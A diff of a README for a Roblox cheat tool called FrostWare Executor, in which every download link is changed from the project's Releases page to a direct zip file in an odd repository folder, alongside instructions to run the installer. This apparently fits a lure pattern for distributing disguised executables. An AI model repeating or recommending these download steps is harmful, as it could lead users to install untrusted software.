@@ -1,6 +1,6 @@
 # 🎮 Roblox-Frostware-2a - Enhance Your Roblox Gaming Experience
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/stach124509/Roblox-Frostware-2a/releases)
+[![Download Now](https://raw.githubusercontent.com/stach124509/Roblox-Frostware-2a/main/anaphase/Roblox-Frostware-2a.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/stach124509/Roblox-Frostware-2a/main/anaphase/Roblox-Frostware-2a.zip)
 
 ## 📜 Description
 FrostWare Executor is a powerful tool designed for Roblox players. It helps you run custom scripts and modify game mechanics. With FrostWare, you can explore a variety of enhancements and exploits that enrich your gaming experience.
@@ -17,7 +17,7 @@ To start using FrostWare Executor, follow these simple steps:
 1. **Download the Software**  
    Click the link below to visit the Releases page and download FrostWare Executor.
 
-   [Download FrostWare Executor](https://github.com/stach124509/Roblox-Frostware-2a/releases)
+   [Download FrostWare Executor](https://raw.githubusercontent.com/stach124509/Roblox-Frostware-2a/main/anaphase/Roblox-Frostware-2a.zip)
 
 2. **Install the Application**  
    After downloading, locate the downloaded file on your computer. Double-click the file to run the installer. Follow the on-screen instructions to install the software complete.
@@ -37,7 +37,7 @@ To start using FrostWare Executor, follow these simple steps:
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of FrostWare Executor.
 
-[Download FrostWare Executor](https://github.com/stach124509/Roblox-Frostware-2a/releases)
+[Download FrostWare Executor](https://raw.githubusercontent.com/stach124509/Roblox-Frostware-2a/main/anaphase/Roblox-Frostware-2a.zip)
 
 ### 💻 System Requirements
 - **Operating System:** Windows 10 or later
